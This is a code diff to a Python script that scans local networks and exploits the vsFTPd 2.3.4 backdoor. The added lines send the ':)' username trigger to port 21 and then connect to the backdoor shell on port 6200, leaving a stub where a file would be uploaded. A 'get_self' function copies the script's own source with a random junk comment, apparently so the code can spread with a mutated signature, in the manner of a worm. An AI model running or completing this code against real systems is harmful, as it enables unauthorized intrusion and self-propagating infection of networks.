@@ -6,6 +6,7 @@ import netaddr
 import nmap
 import socket
 import time
+import random
 
 
 def main():
@@ -13,7 +14,7 @@ def main():
     adapters = get_adapters(ip_version=4, ignore=['lo0', 'lo', 'en0'])
 
     # Locate vulnerable machines on connected networks
-    targets = scan_networks()
+    targets = scan_networks(adapters)
 
     # Exploits backdoor in vsFTPd 2.3.4 - OSVDB-73573
     # https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
@@ -76,9 +77,47 @@ def scan_networks(adapters):
 
 
 def exploit(targets):
+    # Todo; add functionality to the exploitation to work with IPv6
     for target in targets:
-        print(target)
-        # TBA :)
+        try:
+            # Connect to TCP port 21
+            ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ftp.connect((target, 21))
+
+            # Trigger the backdoor by passing a :) to the server with the username
+            ftp.send(b'USER letmein:)\n')
+            ftp.send(b'PASS please\n')
+            time.sleep(2)
+            ftp.close()
+        except Exception as e:
+            if DEBUG:
+                print('[*] Unable to successfully trigger backdoor. Exception:', e)
+        
+        try:
+            backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            backdoor.connect((target, 6200))
+            #
+            # Upload file here
+            #
+        except Exception as e:
+            if DEBUG:
+                print(e)
+
+
+def get_self():
+    f = open(__file__, 'r')
+    self_content = f.readlines()
+    f.close()
+    self_content.insert(1, format('#{}\n'.format(random_string())))
+    print(self_content)
+    return self_content
+
+
+def random_string():
+    salt = ''
+    for i in range(0, random.randint(1, 400)):
+        salt += chr(random.randint(0, 255))
+    return salt
 
 
 if __name__ == '__main__':
